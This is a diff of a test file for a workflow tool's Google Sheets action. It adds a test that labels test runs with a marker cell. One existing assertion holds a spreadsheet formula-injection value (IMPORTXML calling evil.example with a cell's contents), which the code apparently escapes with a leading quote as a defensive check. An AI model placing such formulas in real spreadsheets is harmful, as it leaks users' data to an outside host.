@@ -6,7 +6,7 @@ import { renderTemplate, type ActionConnection, type ActionContext } from "@igni
 import { createKeyring } from "@ignitra/core/server";
 import { connections, createDb, users, type DbHandle } from "@ignitra/db";
 import { createEmailAction, emailParams } from "./actions/email";
-import { createGoogleSheetsAction, googleSheetsParams } from "./actions/google-sheets";
+import { SHEETS_TEST_MARKER, createGoogleSheetsAction, googleSheetsParams } from "./actions/google-sheets";
 import { httpRequestAction, httpRequestParams } from "./actions/http-request";
 import { httpDestination, loadConnection, resendEmailCode, startEmailConnection, verifyEmailConnection } from "./connections";
 import { exchangeGoogleCode, googleAuthUrl, signOAuthState, verifyOAuthState, type GoogleConfig } from "./google";
@@ -247,6 +247,13 @@ describe("GOOGLE_SHEETS", () => {
     expect(JSON.parse(append.body)).toEqual({ majorDimension: "ROWS", values: [["2026-11-07T02:00:00Z", '\'=IMPORTXML("https://evil.example/?"&A1,"//a")', "-12.5"]] });
     const token = new URLSearchParams(hits[0]?.body);
     expect(Object.fromEntries(token)).toEqual({ client_id: "client-id.apps", client_secret: "client-secret", refresh_token: "1//refresh", grant_type: "refresh_token" });
+  });
+
+  it("labels TEST runs with a trailing cell, leaving the data columns untouched", async () => {
+    const p = googleSheetsParams.parse({ connection_id: `conn_${"0".repeat(26)}`, spreadsheet: SHEET, values: ["{{trigger.amount}}"] });
+    expect((await createGoogleSheetsAction(cfg()).execute(p, ctx({ connection: google, isTest: true }, { amount: "12.5" }))).status).toBe("succeeded");
+    const append = hits.find((h) => h.url.startsWith("/sheets/")) as Hit;
+    expect(JSON.parse(append.body).values).toEqual([["12.5", SHEETS_TEST_MARKER]]);
   });
 
   it("explains revoked access and missing permissions; retries 401 with a fresh token", async () => {
